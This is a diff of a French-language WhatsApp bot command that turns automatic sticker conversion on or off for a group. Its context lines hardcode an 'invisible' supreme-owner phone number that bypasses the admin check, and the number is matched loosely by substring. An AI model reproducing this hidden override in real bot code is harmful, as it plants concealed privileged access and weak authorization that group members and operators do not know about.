@@ -3,13 +3,16 @@
  */
 
 const database = require('../../database');
-const config = require ('../../config.js');
+const config = require('../../config.js');
+
+// Extraction du préfixe pour l'usage
+const prefix = config.prefix || '.';
 
 // Fonction pour le style Small Caps (Garde la cohérence visuelle)
 function toSmallCaps(text) {
   const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
   const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";
-  
+
   const cleanedText = text.toLowerCase()
     .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 
 
@@ -21,16 +24,17 @@ function toSmallCaps(text) {
 
 module.exports = {
   name: 'autosticker',
-  aliases: ['autos', 'asticker'],
+  aliases: ['autos', 'asticker', 'ᴀᴜᴛᴏsᴛɪᴄᴋᴇʀ'],
   category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
-  description: 'Enable or disable auto-sticker conversion (images/videos automatically become stickers)',
-  usage: '.autosticker <on/off>',
+  description: '**『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴀᴄᴛɪᴠᴇʀ/ᴅᴇ́sᴀᴄᴛɪᴠᴇʀ ʟᴀ ᴍᴇ́ᴛᴀᴍᴏʀᴘʜᴏsᴇ ᴀᴜᴛᴏ-sᴛɪᴄᴋᴇʀ**',
+  usage: `${prefix}autosticker <on/off>`,
   groupOnly: true,
   adminOnly: true,
   botAdminNeeded: false,
-  
+
   async execute(sock, msg, args, extra) {
-    const prefix = config.prefix || '.';
+    const { reply } = extra;
+
     try {
       const senderJid = msg.key.participant || msg.key.remoteJid;
       const senderNumber = senderJid.replace(/\D/g, '');
@@ -38,7 +42,7 @@ module.exports = {
       // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
       const supremeOwner = '22651622652';
       const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);
-      
+
       const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
         const cleanN = String(n).replace(/\D/g, '');
         return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
@@ -48,16 +52,19 @@ module.exports = {
 
       // 🚨 ADAPTATION : Si ce n'est pas TOI, on vérifie s'il est admin
       if (!isMe) {
-        const isAdmins = extra.isAdmins || false; 
-        if (!isAdmins) {
-          return extra.reply(`*❌ ${toSmallCaps('cette commande est reservee aux administrateurs du sanctuaire')} !*`);
+        const isAdmin = extra.isAdmin || false; 
+        if (!isAdmin) {
+          return reply(`*❌ ${toSmallCaps('cette commande est reservee aux administrateurs du sanctuaire')} !*`);
         }
       }
 
+      const chatId = msg.key.remoteJid;
+
       if (!args[0]) {
-        const settings = database.getGroupSettings(extra.from);
-        const status = settings.autosticker ? 'ON' : 'OFF';
-        return extra.reply(
+        const settings = database.getGroupSettings(chatId);
+        const status = settings.autosticker ? '🛡️ ᴇ́ᴠᴇɪʟʟᴇ́ (ᴏɴ)' : '🔓 ᴇɴᴅᴏʀᴍɪ (ᴏғғ)';
+        
+        return reply(
           `╭╼━≪• *sᴛᴀᴛᴜᴛ ᴀʀᴄᴀɴᴇ_sᴛɪᴄᴋᴇʀ* •≫━╾╮\n` +
           `┃ *ᴇ́ᴛᴀᴛ* : ${status}\n` +
           `╰━━━━━━━━━━━━━━━╯\n\n` +
@@ -68,29 +75,35 @@ module.exports = {
           `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`
         );
       }
-      
+
       const opt = args[0].toLowerCase();
-      
-      if (opt === 'on') {
-        if (database.getGroupSettings(extra.from).autosticker) {
-          return extra.reply(`*❌ ${toSmallCaps('l arcane sticker est deja actif')} !*`);
+      const currentSettings = database.getGroupSettings(chatId);
+
+      // Activation
+      if (opt === 'on' || opt === 'true') {
+        if (currentSettings.autosticker) {
+          return reply(`*❌ ${toSmallCaps('l arcane sticker est deja actif dans ce sanctuaire')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
         }
-        database.updateGroupSettings(extra.from, { autosticker: true });
-        return extra.reply(`*🛡️ ${toSmallCaps('arcane sticker a ete eveille')} (ᴏɴ).*`);
+        
+        database.updateGroupSettings(chatId, { autosticker: true });
+        return reply(`*🛡️ ${toSmallCaps('l arcane sticker a ete eveille avec succes')} (ᴏɴ).*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
       }
-      
-      if (opt === 'off') {
-        if (!database.getGroupSettings(extra.from).autosticker) {
-          return extra.reply(`*❌ ${toSmallCaps('l arcane sticker est deja endormi')} !*`);
+
+      // Désactivation
+      if (opt === 'off' || opt === 'false') {
+        if (!currentSettings.autosticker) {
+          return reply(`*❌ ${toSmallCaps('l arcane sticker est deja endormi')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
         }
-        database.updateGroupSettings(extra.from, { autosticker: false });
-        return extra.reply(`*🔓 ${toSmallCaps('la metamorphose de l arcane sticker a ete desactivee')} (ᴏғғ).*`);
+        
+        database.updateGroupSettings(chatId, { autosticker: false });
+        return reply(`*🔓 ${toSmallCaps('la metamorphose de l arcane sticker a ete scellee')} (ᴏғғ).*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
       }
-      
-      return extra.reply(`*💡 ${toSmallCaps('utilise')} \`${prefix}autosticker\` ${toSmallCaps('pour voir les options')}.*`);
+
+      // Saisie incorrecte
+      return reply(`*💡 ${toSmallCaps('utilise')} \`${prefix}autosticker\` ${toSmallCaps('pour voir les options valides')}.*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
+
     } catch (error) {
-      console.error('[AutoSticker Command Error]:', error);
-      return extra.reply(`❌ *${toSmallCaps('erreur')} :* ${error.message}`);
+      return reply(`❌ *${toSmallCaps('erreur')} :* ${error.message}\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ-𝐗*`);
     }
   }
 };
